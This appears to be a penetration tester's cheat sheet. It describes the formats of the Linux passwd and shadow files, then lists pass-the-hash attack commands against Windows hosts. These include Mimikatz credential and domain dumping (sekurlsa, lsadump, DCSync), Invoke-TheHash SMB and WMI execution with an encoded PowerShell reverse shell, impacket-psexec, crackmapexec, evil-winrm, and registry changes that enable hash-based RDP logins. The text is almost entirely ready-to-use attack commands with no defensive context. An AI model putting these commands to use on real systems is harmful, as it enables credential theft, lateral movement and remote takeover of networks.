/etc/passwd: <username>:<passwd info: x- stored in shadow>:<uid>:<guid>:<fullname>:<home>:<shell>
/etc/shadow: <username>:<encrypted>:<Last Change>:<min pw age>:<max pw age>:<warning period>:<inactivity period>:<expiration>
<encrypted>: $<type>$<salt>$<hashed>
<type>: 1 - MD5, 2a - blowfish, 2y - eksblowfish, 5 - sha-256, 6 - sha-512
/etc/security/opasswd: old password file

PassTheHash(PtH)
-Windows
    1.Mimikatz: 
        impersonate - mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /domain:<domain> /rc4 or NTLM:<hash> /run:cmd.exe" exit
        credential - mimikatz.exe privilege::debug "sekurlsa::logonpasswords"
                   - mimikatz.exe privilege::debug "sekurlsa::msv"
        cached credential - mimikatz.exe privilege::debug "lsadump::cache"
        dump sam - mimikatz.exe privilege::debug "token::elevate lsadump::sam"
        dump domain - mimikatz.exe lsadump::dcsync /domain:<domain> /all /csv
    2.Invoke-TheHash.psd1: 
        -SMB part:
            import-module invoke-thehash.psd1
            invoke-smbexec -target <ip> -domain <domain> -hash <hash> -command "<command>"
        -WMI part:
            invoke-wmiexec -target <ip or machine name> -domain <domain> -hash <hash> -command "powershell -e <reverse shell encrypted>"
-Linux:
    1.Impacket:
        impacket-psexec <user>@<ip> -hashes :<hash>
    2.crackmapexec:
        crackmapexec smb <ip range> -u <user> -d . -H <hash> -x <command>
    3.evil-winrm:
        evil-winrm -i <ip> -u <user> -H <hash>
    4.RDP: 
        ***Need Restricted Admin Mode: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
        ***May also need HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 0
        xfreerdp /u:<username> /v:<ip> /pth:<hash>

